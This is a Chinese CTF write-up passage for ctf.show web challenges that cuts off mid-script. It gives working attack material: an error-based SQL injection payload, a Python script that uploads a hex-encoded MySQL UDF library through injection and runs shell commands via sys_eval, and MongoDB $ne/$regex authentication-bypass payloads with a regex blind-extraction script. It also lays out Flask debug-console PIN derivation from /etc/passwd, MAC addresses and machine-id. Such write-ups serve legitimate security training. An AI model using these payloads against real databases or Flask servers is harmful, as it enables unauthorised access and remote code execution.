后边正常查就行，要注意的就是别忘了加limit，还有就是字段名flag变成了flag?，表名和字段名都可以用反引号引起来，这是用来区分MYSQL的保留字与普通字符。所以最终的payload为 http:&#x2F;&#x2F;73673ded-1809-4e00-a9cf-eb2535a42fa6.challenge.ctf.show&#x2F;api&#x2F;?id&#x3D;-1&#39; Union select 1,count(*),concat((select &#96;flag?&#96; from ctfshow_flagsa),0x26,ceil(rand(0)*2))x from information_schema.columns group by x;--+ web248sql语句 $sql &#x3D; &quot;select id,username,pass from ctfshow_user where id &#x3D; &#39;&quot;.$id.&quot;&#39; limit 1;&quot;; 返回逻辑 &#x2F;&#x2F;无过滤, 题目提示是udf注入 原理大致就是mysql可以把dll文件写到目标机子的plugin目录，这个目录是可以通过select @@plugin_dir来得到的。 &#x2F;api&#x2F;?id&#x3D;1&#39;; select @@plugin_dir; -- - 查出Mysql插件路径：&#x2F;usr&#x2F;lib&#x2F;mariadb&#x2F;plugin&#x2F; &#x2F;api&#x2F;?id&#x3D;&#39;;CREATE FUNCTION sys_eval RETURNS STRING SONAME &#39;udf.so&#39;;--+ 引入udf.so文件从而创建函数sys_eval 大师傅的脚本 import requests base_url&#x3D;&quot;http:&#x2F;&#x2F;994eba84-9ea5-4701-b204-01320382100c.challenge.ctf.show&#x2F;api&#x2F;&quot; payload &#x3D; [] text &#x3D; [&quot;a&quot;, &quot;b&quot;, &quot;c&quot;, &quot;d&quot;, &quot;e&quot;] udf &#x3D; &quot;7F454C4602010100000000000000000003003E0001000000800A000000000000400000000000000058180000000000000000000040003800060040001C0019000100000005000000000000000000000000000000000000000000000000000000C414000000000000C41400000000000000002000000000000100000006000000C814000000000000C814200000000000C8142000000000004802000000000000580200000000000000002000000000000200000006000000F814000000000000F814200000000000F814200000000000800100000000000080010000000000000800000000000000040000000400000090010000000000009001000000000000900100000000000024000000000000002400000000000000040000000000000050E574640400000044120000000000004412000000000000441200000000000084000000000000008400000000000000040000000000000051E5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000040000001400000003000000474E5500D7FF1D94176ABA0C150B4F3694D2EC995AE8E1A8000000001100000011000000020000000700000080080248811944C91CA44003980468831100000013000000140000001600000017000000190000001C0000001E000000000000001F00000000000000200000002100000022000000230000002400000000000000CE2CC0BA673C7690EBD3EF0E78722788B98DF10ED971581CA868BE12BBE3927C7E8B92CD1E7066A9C3F9BFBA745BB073371974EC4345D5ECC5A62C1CC3138AFF3B9FD4A0AD73D1C50B5911FEAB5FBE1200000000000000000000000000000000000000000000000000000000000000000300090088090000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000CD00000012000000000000000000000000000000000000001E0100001200000000000000000000000000000000000000620100001200000000000000000000000000000000000000E30000001200000000000000000000000000000000000000B90000001200000000000000000000000000000000000000680100001200000000000000000000000000000000000000160000002200000000000000000000000000000000000000540000001200000000000000000000000000000000000000F00000001200000000000000000000000000000000000000B200000012000000000000000000000000000000000000005A01000012000000000000000000000000000000000000005201000012000000000000000000000000000000000000004C0100001200000000000000000000000000000000000000E800000012000B00D10D000000000000D1000000000000003301000012000B00A90F0000000000000A000000000000001000000012000C00481100000000000000000000000000007800000012000B009F0B0000000000004C00000000000000FF0000001200090088090000000000000000000000000000800100001000F1FF101720000000000000000000000000001501000012000B00130F0000000000002F000000000000008C0100001000F1FF201720000000000000000000000000009B00000012000B00480C0000000000000A000000000000002501000012000B00420F0000000000006700000000000000AA00000012000B00520C00000000000063000000000000005B00000012000B00950B0000000000000A000000000000008E00000012000B00EB0B0000000000005D00000000000000790100001000F1FF101720000000000000000000000000000501000012000B00090F0000000000000A00000000000000C000000012000B00B50C000000000000F100000000000000F700000012000B00A20E00000000000067000000000000003900000012000B004C0B0000000000004900000000000000D400000012000B00A60D0000000000002B000000000000004301000012000B00B30F0000000000005501000000000000005F5F676D6F6E5F73746172745F5F005F66696E69005F5F6378615F66696E616C697A65005F4A765F5265676973746572436C6173736573006C69625F6D7973716C7564665F7379735F696E666F5F696E6974006D656D637079006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974006C69625F6D7973716C7564665F7379735F696E666F007379735F6765745F696E6974007379735F6765745F6465696E6974007379735F67657400676574656E76007374726C656E007379735F7365745F696E6974006D616C6C6F63007379735F7365745F6465696E69740066726565007379735F73657400736574656E76007379735F657865635F696E6974007379735F657865635F6465696E6974007379735F657865630073797374656D007379735F6576616C5F696E6974007379735F6576616C5F6465696E6974007379735F6576616C00706F70656E007265616C6C6F63007374726E6370790066676574730070636C6F7365006C6962632E736F2E36005F6564617461005F5F6273735F7374617274005F656E6400474C4942435F322E322E3500000000000000000000020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001006F0100001000000000000000751A6909000002009101000000000000F0142000000000000800000000000000F0142000000000007816200000000000060000000200000000000000000000008016200000000000060000000300000000000000000000008816200000000000060000000A0000000000000000000000A81620000000000007000000040000000000000000000000B01620000000000007000000050000000000000000000000B81620000000000007000000060000000000000000000000C01620000000000007000000070000000000000000000000C81620000000000007000000080000000000000000000000D01620000000000007000000090000000000000000000000D816200000000000070000000A0000000000000000000000E016200000000000070000000B0000000000000000000000E816200000000000070000000C0000000000000000000000F016200000000000070000000D0000000000000000000000F816200000000000070000000E00000000000000000000000017200000000000070000000F00000000000000000000000817200000000000070000001000000000000000000000004883EC08E8EF000000E88A010000E8750700004883C408C3FF35F20C2000FF25F40C20000F1F4000FF25F20C20006800000000E9E0FFFFFFFF25EA0C20006801000000E9D0FFFFFFFF25E20C20006802000000E9C0FFFFFFFF25DA0C20006803000000E9B0FFFFFFFF25D20C20006804000000E9A0FFFFFFFF25CA0C20006805000000E990FFFFFFFF25C20C20006806000000E980FFFFFFFF25BA0C20006807000000E970FFFFFFFF25B20C20006808000000E960FFFFFFFF25AA0C20006809000000E950FFFFFFFF25A20C2000680A000000E940FFFFFFFF259A0C2000680B000000E930FFFFFFFF25920C2000680C000000E920FFFFFF4883EC08488B05ED0B20004885C07402FFD04883C408C390909090909090909055803D680C2000004889E5415453756248833DD00B200000740C488D3D2F0A2000E84AFFFFFF488D1D130A20004C8D25040A2000488B053D0C20004C29E348C1FB034883EB014839D873200F1F4400004883C0014889051D0C200041FF14C4488B05120C20004839D872E5C605FE0B2000015B415CC9C3660F1F84000000000048833DC009200000554889E5741A488B054B0B20004885C0740E488D3DA7092000C9FFE00F1F4000C9C39090554889E54883EC3048897DE8488975E0488955D8488B45E08B0085C07421488D0DE7050000488B45D8BA320000004889CE4889C7E89BFEFFFFC645FF01EB04C645FF000FB645FFC9C3554889E548897DF8C9C3554889E54883EC3048897DF8488975F0488955E848894DE04C8945D84C894DD0488D0DCA050000488B45E8BA1F0000004889CE4889C7E846FEFFFF488B45E048C7001E000000488B45E8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F801751C488B45F0488B40088B0085C0750E488B45F8C60001B800000000EB20488D0D83050000488B45E8BA2B0000004889CE4889C7E8DFFDFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC4048897DE8488975E0488955D848894DD04C8945C84C894DC0488B45E0488B4010488B004889C7E8BBFDFFFF488945F848837DF8007509488B45C8C60001EB16488B45F84889C7E84BFDFFFF4889C2488B45D0488910488B45F8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F8027425488D0D05050000488B45E8BA1F0000004889CE4889C7E831FDFFFFB801000000E9AB000000488B45F0488B40088B0085C07422488D0DF2040000488B45E8BA280000004889CE4889C7E8FEFCFFFFB801000000EB7B488B45F0488B40084883C004C70000000000488B45F0488B4018488B10488B45F0488B40184883C008488B00488D04024883C0024889C7E84BFCFFFF4889C2488B45F848895010488B45F8488B40104885C07522488D0DA4040000488B45E8BA1A0000004889CE4889C7E888FCFFFFB801000000EB05B800000000C9C3554889E54883EC1048897DF8488B45F8488B40104885C07410488B45F8488B40104889C7E811FCFFFFC9C3554889E54883EC3048897DE8488975E0488955D848894DD0488B45E8488B4010488945F0488B45E0488B4018488B004883C001480345F0488945F8488B45E0488B4018488B10488B45E0488B4010488B08488B45F04889CE4889C7E8EFFBFFFF488B45E0488B4018488B00480345F0C60000488B45E0488B40184883C008488B10488B45E0488B40104883C008488B08488B45F84889CE4889C7E8B0FBFFFF488B45E0488B40184883C008488B00480345F8C60000488B4DF8488B45F0BA010000004889CE4889C7E892FBFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0DC2020000488B45D8BA2B0000004889CE4889C7E81EFBFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC2048897DF8488975F0488955E848894DE0488B45F0488B4010488B004889C7E882FAFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0D22020000488B45D8BA2B0000004889CE4889C7E87EFAFFFFB801000000C9C3554889E548897DF8C9C3554889E54881EC500400004889BDD8FBFFFF4889B5D0FBFFFF488995C8FBFFFF48898DC0FBFFFF4C8985B8FBFFFF4C898DB0FBFFFFBF01000000E8BEF9FFFF488985C8FBFFFF48C745F000000000488B85D0FBFFFF488B4010488B00488D352C0200004889C7E852FAFFFF488945E8EB63488D85E0FBFFFF4889C7E8BDF9FFFF488945F8488B45F8488B55F04801C2488B85C8FBFFFF4889D64889C7E80CFAFFFF488985C8FBFFFF488D85E0FBFFFF488B55F0488B8DC8FBFFFF4801D1488B55F84889C64889CFE8D1F9FFFF488B45F8480145F0488B55E8488D85E0FBFFFFBE000400004889C7E831F9FFFF4885C07580488B45E84889C7E850F9FFFF488B85C8FBFFFF0FB60084C0740A4883BDC8FBFFFF00750C488B85B8FBFFFFC60001EB2B488B45F0488B95C8FBFFFF488D0402C60000488B85C8FBFFFF4889C7E8FBF8FFFF488B95C0FBFFFF488902488B85C8FBFFFFC9C39090909090909090554889E5534883EC08488B05A80320004883F8FF7419488D1D9B0320000F1F004883EB08FFD0488B034883F8FF75F14883C4085BC9C390904883EC08E84FF9FFFF4883C408C300004E6F20617267756D656E747320616C6C6F77656420287564663A206C69625F6D7973716C7564665F7379735F696E666F29000000000000006C69625F6D7973716C7564665F7379732076657273696F6E20302E302E33000045787065637465642065786163746C79206F6E6520737472696E67207479706520706172616D6574657200000000000045787065637465642065786163746C792074776F20617267756D656E74730000457870656374656420737472696E67207479706520666F72206E616D6520706172616D6574657200436F756C64206E6F7420616C6C6F63617465206D656D6F7279007200011B033B800000000F00000008F9FFFF9C00000051F9FFFFBC0000005BF9FFFFDC000000A7F9FFFFFC00000004FAFFFF1C0100000EFAFFFF3C01000071FAFFFF5C01000062FBFFFF7C0100008DFBFFFF9C0100005EFCFFFFBC010000C5FCFFFFDC010000CFFCFFFFFC010000FEFCFFFF1C02000065FDFFFF3C0200006FFDFFFF5C0200001400000000000000017A5200017810011B0C0708900100001C0000001C00000064F8FFFF4900000000410E108602430D0602440C070800001C0000003C0000008DF8FFFF0A00000000410E108602430D06450C07080000001C0000005C00000077F8FFFF4C00000000410E108602430D0602470C070800001C0000007C000000A3F8FFFF5D00000000410E108602430D0602580C070800001C0000009C000000E0F8FFFF0A00000000410E108602430D06450C07080000001C000000BC000000CAF8FFFF6300000000410E108602430D06025E0C070800001C000000DC0000000DF9FFFFF100000000410E108602430D0602EC0C070800001C000000FC000000DEF9FFFF2B00000000410E108602430D06660C07080000001C0000001C010000E9F9FFFFD100000000410E108602430D0602CC0C070800001C0000003C0100009AFAFFFF6700000000410E108602430D0602620C070800001C0000005C010000E1FAFFFF0A00000000410E108602430D06450C07080000001C0000007C010000CBFAFFFF2F00000000410E108602430D066A0C07080000001C0000009C010000DAFAFFFF6700000000410E108602430D0602620C070800001C000000BC01000021FBFFFF0A00000000410E108602430D06450C07080000001C000000DC0100000BFBFFFF5501000000410E108602430D060350010C0708000000000000000000FFFFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFFFFFF00000000000000000000000000000000F01420000000000001000000000000006F010000000000000C0000000000000088090000000000000D000000000000004811000000000000F5FEFF6F00000000B8010000000000000500000000000000E805000000000000060000000000000070020000000000000A000000000000009D010000000000000B000000000000001800000000000000030000000000000090162000000000000200000000000000380100000000000014000000000000000700000000000000170000000000000050080000000000000700000000000000F0070000000000000800000000000000600000000000000009000000000000001800000000000000FEFFFF6F00000000D007000000000000FFFFFF6F000000000100000000000000F0FFFF6F000000008607000000000000F9FFFF6F0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000F81420000000000000000000000000000000000000000000B609000000000000C609000000000000D609000000000000E609000000000000F609000000000000060A000000000000160A000000000000260A000000000000360A000000000000460A000000000000560A000000000000660A000000000000760A0000000000004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D3429004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D31372900002E73796D746162002E737472746162002E7368737472746162002E6E6F74652E676E752E6275696C642D6964002E676E752E68617368002E64796E73796D002E64796E737472002E676E752E76657273696F6E002E676E752E76657273696F6E5F72002E72656C612E64796E002E72656C612E706C74002E696E6974002E74657874002E66696E69002E726F64617461002E65685F6672616D655F686472002E65685F6672616D65002E63746F7273002E64746F7273002E6A6372002E646174612E72656C2E726F002E64796E616D6963002E676F74002E676F742E706C74002E627373002E636F6D6D656E7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001B0000000700000002000000000000009001000000000000900100000000000024000000000000000000000000000000040000000000000000000000000000002E000000F6FFFF6F0200000000000000B801000000000000B801000000000000B400000000000000030000000000000008000000000000000000000000000000380000000B000000020000000000000070020000000000007002000000000000780300000000000004000000020000000800000000000000180000000000000040000000030000000200000000000000E805000000000000E8050000000000009D0100000000000000000000000000000100000000000000000000000000000048000000FFFFFF6F0200000000000000860700000000000086070000000000004A0000000000000003000000000000000200000000000000020000000000000055000000FEFFFF6F0200000000000000D007000000000000D007000000000000200000000000000004000000010000000800000000000000000000000000000064000000040000000200000000000000F007000000000000F00700000000000060000000000000000300000000000000080000000000000018000000000000006E000000040000000200000000000000500800000000000050080000000000003801000000000000030000000A000000080000000000000018000000000000007800000001000000060000000000000088090000000000008809000000000000180000000000000000000000000000000400000000000000000000000000000073000000010000000600000000000000A009000000000000A009000000000000E0000000000000000000000000000000040000000000000010000000000000007E000000010000000600000000000000800A000000000000800A000000000000C80600000000000000000000000000001000000000000000000000000000000084000000010000000600000000000000481100000000000048110000000000000E000000000000000000000000000000040000000000000000000000000000008A00000001000000020000000000000058110000000000005811000000000000EC0000000000000000000000000000000800000000000000000000000000000092000000010000000200000000000000441200000000000044120000000000008400000000000000000000000000000004000000000000000000000000000000A0000000010000000200000000000000C812000000000000C812000000000000FC01000000000000000000000000000008000000000000000000000000000000AA000000010000000300000000000000C814200000000000C8140000000000001000000000000000000000000000000008000000000000000000000000000000B1000000010000000300000000000000D814200000000000D8140000000000001000000000000000000000000000000008000000000000000000000000000000B8000000010000000300000000000000E814200000000000E8140000000000000800000000000000000000000000000008000000000000000000000000000000BD000000010000000300000000000000F014200000000000F0140000000000000800000000000000000000000000000008000000000000000000000000000000CA000000060000000300000000000000F814200000000000F8140000000000008001000000000000040000000000000008000000000000001000000000000000D3000000010000000300000000000000781620000000000078160000000000001800000000000000000000000000000008000000000000000800000000000000D8000000010000000300000000000000901620000000000090160000000000008000000000000000000000000000000008000000000000000800000000000000E1000000080000000300000000000000101720000000000010170000000000001000000000000000000000000000000008000000000000000000000000000000E60000000100000030000000000000000000000000000000101700000000000059000000000000000000000000000000010000000000000001000000000000001100000003000000000000000000000000000000000000006917000000000000EF00000000000000000000000000000001000000000000000000000000000000010000000200000000000000000000000000000000000000581F00000000000068070000000000001B0000002C00000008000000000000001800000000000000090000000300000000000000000000000000000000000000C02600000000000042030000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000003000100900100000000000000000000000000000000000003000200B80100000000000000000000000000000000000003000300700200000000000000000000000000000000000003000400E80500000000000000000000000000000000000003000500860700000000000000000000000000000000000003000600D00700000000000000000000000000000000000003000700F00700000000000000000000000000000000000003000800500800000000000000000000000000000000000003000900880900000000000000000000000000000000000003000A00A00900000000000000000000000000000000000003000B00800A00000000000000000000000000000000000003000C00481100000000000000000000000000000000000003000D00581100000000000000000000000000000000000003000E00441200000000000000000000000000000000000003000F00C81200000000000000000000000000000000000003001000C81420000000000000000000000000000000000003001100D81420000000000000000000000000000000000003001200E81420000000000000000000000000000000000003001300F01420000000000000000000000000000000000003001400F81420000000000000000000000000000000000003001500781620000000000000000000000000000000000003001600901620000000000000000000000000000000000003001700101720000000000000000000000000000000000003001800000000000000000000000000000000000100000002000B00800A0000000000000000000000000000110000000400F1FF000000000000000000000000000000001C00000001001000C81420000000000000000000000000002A00000001001100D81420000000000000000000000000003800000001001200E81420000000000000000000000000004500000002000B00A00A00000000000000000000000000005B00000001001700101720000000000001000000000000006A00000001001700181720000000000008000000000000007800000002000B00200B0000000000000000000000000000110000000400F1FF000000000000000000000000000000008400000001001000D01420000000000000000000000000009100000001000F00C01400000000000000000000000000009F00000001001200E8142000000000000000000000000000AB00000002000B0010110000000000000000000000000000C10000000400F1FF00000000000000000000000000000000D40000000100F1FF90162000000000000000000000000000EA00000001001300F0142000000000000000000000000000F700000001001100E0142000000000000000000000000000040100000100F1FFF81420000000000000000000000000000D01000012000B00D10D000000000000D1000000000000001501000012000B00130F0000000000002F000000000000001E01000020000000000000000000000000000000000000002D01000020000000000000000000000000000000000000004101000012000C00481100000000000000000000000000004701000012000B00A90F0000000000000A000000000000005701000012000000000000000000000000000000000000006B01000012000000000000000000000000000000000000007F01000012000B00A20E00000000000067000000000000008D01000012000B00B30F0000000000005501000000000000960100001200000000000000000000000000000000000000A901000012000B00950B0000000000000A00000000000000C601000012000B00B50C000000000000F100000000000000D30100001200000000000000000000000000000000000000E50100001200000000000000000000000000000000000000F901000012000000000000000000000000000000000000000D02000012000B004C0B00000000000049000000000000002802000022000000000000000000000000000000000000004402000012000B00A60D0000000000002B000000000000005302000012000B00EB0B0000000000005D000000000000006002000012000B00480C0000000000000A000000000000006F02000012000000000000000000000000000000000000008302000012000B00420F0000000000006700000000000000910200001200000000000000000000000000000000000000A50200001200000000000000000000000000000000000000B902000012000B00520C0000000000006300000000000000C10200001000F1FF10172000000000000000000000000000CD02000012000B009F0B0000000000004C00000000000000E30200001000F1FF20172000000000000000000000000000E80200001200000000000000000000000000000000000000FD02000012000B00090F0000000000000A000000000000000D0300001200000000000000000000000000000000000000220300001000F1FF101720000000000000000000000000002903000012000000000000000000000000000000000000003C03000012000900880900000000000000000000000000000063616C6C5F676D6F6E5F73746172740063727473747566662E63005F5F43544F525F4C4953545F5F005F5F44544F525F4C4953545F5F005F5F4A43525F4C4953545F5F005F5F646F5F676C6F62616C5F64746F72735F61757800636F6D706C657465642E363335320064746F725F6964782E36333534006672616D655F64756D6D79005F5F43544F525F454E445F5F005F5F4652414D455F454E445F5F005F5F4A43525F454E445F5F005F5F646F5F676C6F62616C5F63746F72735F617578006C69625F6D7973716C7564665F7379732E63005F474C4F42414C5F4F46465345545F5441424C455F005F5F64736F5F68616E646C65005F5F44544F525F454E445F5F005F44594E414D4943007379735F736574007379735F65786563005F5F676D6F6E5F73746172745F5F005F4A765F5265676973746572436C6173736573005F66696E69007379735F6576616C5F6465696E6974006D616C6C6F634040474C4942435F322E322E350073797374656D4040474C4942435F322E322E35007379735F657865635F696E6974007379735F6576616C0066676574734040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974007379735F7365745F696E697400667265654040474C4942435F322E322E35007374726C656E4040474C4942435F322E322E350070636C6F73654040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F696E6974005F5F6378615F66696E616C697A654040474C4942435F322E322E35007379735F7365745F6465696E6974007379735F6765745F696E6974007379735F6765745F6465696E6974006D656D6370794040474C4942435F322E322E35007379735F6576616C5F696E697400736574656E764040474C4942435F322E322E3500676574656E764040474C4942435F322E322E35007379735F676574005F5F6273735F7374617274006C69625F6D7973716C7564665F7379735F696E666F005F656E64007374726E6370794040474C4942435F322E322E35007379735F657865635F6465696E6974007265616C6C6F634040474C4942435F322E322E35005F656461746100706F70656E4040474C4942435F322E322E35005F696E697400&quot; for i in range(0,21510, 5000): end &#x3D; i + 5000 payload.append(udf[i:end]) p &#x3D; dict(zip(text, payload)) for t in text: url &#x3D; base_url+&quot;?id&#x3D;&#39;;select unhex(&#39;&#123;&#125;&#39;) into dumpfile &#39;&#x2F;usr&#x2F;lib&#x2F;mariadb&#x2F;plugin&#x2F;&#123;&#125;.txt&#39;--+&amp;page&#x3D;1&amp;limit&#x3D;10&quot;.format(p[t], t) r &#x3D; requests.get(url) print(r.status_code) next_url &#x3D; base_url+&quot;?id&#x3D;&#39;;select concat(load_file(&#39;&#x2F;usr&#x2F;lib&#x2F;mariadb&#x2F;plugin&#x2F;a.txt&#39;),load_file(&#39;&#x2F;usr&#x2F;lib&#x2F;mariadb&#x2F;plugin&#x2F;b.txt&#39;),load_file(&#39;&#x2F;usr&#x2F;lib&#x2F;mariadb&#x2F;plugin&#x2F;c.txt&#39;),load_file(&#39;&#x2F;usr&#x2F;lib&#x2F;mariadb&#x2F;plugin&#x2F;d.txt&#39;),load_file(&#39;&#x2F;usr&#x2F;lib&#x2F;mariadb&#x2F;plugin&#x2F;e.txt&#39;)) into dumpfile &#39;&#x2F;usr&#x2F;lib&#x2F;mariadb&#x2F;plugin&#x2F;udf.so&#39;--+&amp;page&#x3D;1&amp;limit&#x3D;10&quot; rn &#x3D; requests.get(next_url) uaf_url&#x3D;base_url+&quot;?id&#x3D;&#39;;CREATE FUNCTION sys_eval RETURNS STRING SONAME &#39;udf.so&#39;;--+&quot;#导入udf函数 r&#x3D;requests.get(uaf_url) nn_url &#x3D; base_url+&quot;?id&#x3D;&#39;;select sys_eval(&#39;cat &#x2F;flag.*&#39;);--+&amp;page&#x3D;1&amp;limit&#x3D;10&quot; rnn &#x3D; requests.get(nn_url) print(rnn.text) web249sql语句 &#x2F;&#x2F;无 $user &#x3D; $memcache-&gt;get($id); 返回逻辑 &#x2F;&#x2F;无过滤 nosql的注入 NoSQL注入小笔记 - Ruilin (rui0.cn) https://www.anquanke.com/post/id/97211#h2-0 NoSQL相关的SQL攻击:1.重言式。又称为永真式。此类攻击是在条件语句中注入代码,使生成的表达式判定结果永远为真,从而绕过认证或访问机制。比如实际中用$ne操作(不相等)的语法让他们无需相应的凭证即可非法进入系统。 2.联合查询。联合查询是一种众所周知的SQL注入技术,攻击者利用一个脆弱的参数去改变给定查询返回的数据集。联合查询最常用的用法是绕过认证页面获取数据。比如通过增加永真的表达式利用布尔OR运算符进行攻击,从而导致整个语句判定出错,进行非法的数据获取。 3.JavaScript注入。这是一种新的漏洞,由允许执行数据内容中JavaScript的NoSQL数据库引入的。JavaScript使在数据引擎进行复杂事务和查询成为可能。传递不干净的用户输入到这些查询中可以注入任意JavaScript代码,这会导致非法的数据获取或篡改。 4.背负式查询。在背负式查询中,攻击者通过利用转义特定字符(比如像回车和换行之类的结束符)插入由数据库额外执行的查询,这样就可以执行任意代码了。 5.跨域违规。HTTP REST APIs是NoSQL数据库中的一个流行模块,然而,它们引入了一类新的漏洞,它甚至能让攻击者从其他域攻击数据库。在跨域攻击中,攻击者利用合法用户和他们的网页浏览器执行有害的操作。在本文中,我们将展示此类跨站请求伪造(CSRF)攻击形式的违规行为,在此网站信任的用户浏览器将被利用在NoSQL数据库上执行非法操作。通过把HTML格式的代码注入到有漏洞的网站或者欺骗用户进入到攻击者自己的网站上,攻击者可以在目标数据库上执行post动作,从而破坏数据库。 NoSQL MYSQL区别：nosql的定义是not only sql，包括键值数据库，列式数据库，文本数据库，图形数据库等 mysql是一种传统的关系型数据库。 关系型数据库一般都可以通过sql语句进行操作。sql的语法一般遵循SQL99标准，也就是说上层的应用可以通过同样的sql语句访问不同的数据库。 而nosql对sql的支持并不像关系型数据库一样。以hbase为例，它本身并不支持sql，我们可以通过hbase shell进行操作，上层应用可以通过hbase API读写数据库。但是我们也可以通过hive（hive sql，类sql语法）来访问hbase。还有一些hbase skin（可以理解成hbase客户端），支持了部分sql语法以方便用户使用，比如pheonix。 所以payload为 ?id[]&#x3D;flag web250sql语句 $query &#x3D; new MongoDB\\Driver\\Query($data); $cursor &#x3D; $manager-&gt;executeQuery(&#39;ctfshow.ctfshow_user&#39;, $query)-&gt;toArray(); 返回逻辑 &#x2F;&#x2F;无过滤 if(count($cursor)&gt;0)&#123; $ret[&#39;msg&#39;]&#x3D;&#39;登陆成功&#39;; array_push($ret[&#39;data&#39;], $flag); &#125; 还是nosql注入 条件操作符 $gt : &gt; $lt : &lt; $gte: &gt;&#x3D; $lte: &lt;&#x3D; $ne : !&#x3D;、&lt;&gt; $in : in $nin: not in $all: all $or: or $not: 反匹配(1.3.3及以上版本) 模糊查询用正则式：db.customer.find(&#123;&#39;name&#39;: &#123;&#39;$regex&#39;:&#39;.*s.*&#39;&#125; &#125;) &#x2F;** * : 范围查询 &#123; &quot;age&quot; : &#123; &quot;$gte&quot; : 2 , &quot;$lte&quot; : 21&#125;&#125; * : $ne &#123; &quot;age&quot; : &#123; &quot;$ne&quot; : 23&#125;&#125; * : $lt &#123; &quot;age&quot; : &#123; &quot;$lt&quot; : 23&#125;&#125; *&#x2F; db-&gt;logins-&gt;find( array(&quot;username&quot;&#x3D;&gt;(string)$_POST[&quot;username&quot;],&quot;password&quot;&#x3D;&gt;(string)$_ POST[&quot;password&quot;])); 构造$data = array(“username” =&gt; array(&quot;$ne&quot; =&gt; 1), “password” =&gt; array(&quot;$ne&quot; =&gt; 1));进行绕过 还是之前那个文章里面写到的($ne是不相等的意思) username[$ne]&#x3D;1&amp;password[$ne]&#x3D;1 或者利用正则 username[$regex]&#x3D;.&amp;password[$regex]&#x3D;. web251用上一题的姿势，出了admin账号的用户名密码：再改成username不等于admin即可： username[$ne]&#x3D;admin&amp;password[$ne]&#x3D;1 web252直接正则： username[$regex]&#x3D;.*$&amp;password[$ne]&#x3D;1 这里登录测试，还会发现有admin和admin1，可以用这种正则去掉这俩 username[$regex]&#x3D;^[^admin].*$&amp;password[$ne]&#x3D;1 web253sql语句 &#x2F;&#x2F;sql db.ctfshow_user.find(&#123;username:&#39;$username&#39;,password:&#39;$password&#39;&#125;).pretty() 返回逻辑 &#x2F;&#x2F;无过滤 if(count($cursor)&gt;0)&#123; $ret[&#39;msg&#39;]&#x3D;&#39;登陆成功&#39;; array_push($ret[&#39;data&#39;], $flag); &#125; 继续$regex但发现状态码是\\u767b\\u9646\\u6210\\u529f，是查询成功的Unicode编码，但就是没有回显。所以这题结合这个状态码进行盲注 套神的脚本 import requests url&#x3D;&quot;http:&#x2F;&#x2F;81040e32-f0ba-4e17-b9eb-56848ad36c4c.challenge.ctf.show:8080&#x2F;api&#x2F;&quot; letter&#x3D;&quot;-ctfshow0123456789abcdef&#123;,&#125;&quot; flag&#x3D;&quot;&quot; for i in range(1,100): for j in letter: payload&#x3D;&quot;^&#123;&#125;.*$&quot;.format(flag+j) data&#x3D;&#123; &quot;username[$regex]&quot;:&quot;flag&quot;, &quot;password[$regex]&quot;:payload &#125; res&#x3D;requests.post(url,data).text #print(res) if r&quot;\\u767b\\u9646\\u5931\\u8d25&quot; not in res: flag+&#x3D;j print(flag) break if j&#x3D;&#x3D;&quot;&#125;&quot;: print(flag+&quot;--OUT&quot;) exit() Javaweb279常用姿势web801预期解：flask算pin 条件: flask debug模式开启 存在任意文件读取 username，用户名 modname，默认值为flask.app appname，默认值为Flask moddir，flask库下app.py的绝对路径 uuidnode，当前网络的mac地址的十进制数 machine_id，docker机器id probably_public_bits包含4个字段，分别为usernamemodnamegetattr(app, &#39;name&#39;, app.class.name)getattr(mod, &#39;file&#39;, None) 其中username对应的值为当前主机的用户名 linux可以查看/etc/passwd windows可以查看C:/Users目录modname的值为&#39;flask.app&#39;getattr(app, &#39;name&#39;, app.class.name)对应的值为&#39;Flask&#39;getattr(mod, &#39;file&#39;, None)对应的值为app包的绝对路径 private_bits包含两个字段，分别为str(uuid.getnode())get_machine_id() 其中str(uuid.getnode())为网卡mac地址的十进制值 在inux系统下得到存储位置为/sys/class/net/（对应网卡）/address 一般为eth0 windows中cmd执行config /all查看get_machine_id()的值为当前机器唯一的机器码 对于非docker机每一个机器都会有自已唯一的id，linux的id一般存放在/etc/machine-id或/proc/sys/kernel/random/boot_id docker机则读取/proc/self/cgroup。 windows的id在注册表中 （HKEY_LOCAL_MACHINE-&gt;SOFTWARE-&gt;Microsoft-&gt;Cryptography） 其中 python 3.8和3.6 pin码生成方式不同 werkzeug版本不同machine-id获取不同 3.6 MD5 import hashlib import getpass from flask import Flask from itertools import chain import sys import uuid username&#x3D;getpass.getuser() app &#x3D; Flask(__name__) modname&#x3D;getattr(app, &quot;__module__&quot;, app.__class__.__module__) mod &#x3D; sys.modules.get(modname) probably_public_bits &#x3D; [ username, #用户名 一般为root或者读下&#x2F;etc&#x2F;passwd modname, #一般固定为flask.app getattr(app, &quot;__name__&quot;, app.__class__.__name__), #固定，一般为Flask getattr(mod, &quot;__file__&quot;, None), #flask库下app.py的绝对路径，可以通过报错信息得到 ] mac &#x3D;&#39;02:42:ac:0c:ac:28&#39;.replace(&#39;:&#39;,&#39;&#39;) mac&#x3D;str(int(mac,base&#x3D;16)) private_bits &#x3D; [ mac, &quot;机器码&quot; ] h &#x3D; hashlib.md5() for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit &#x3D; 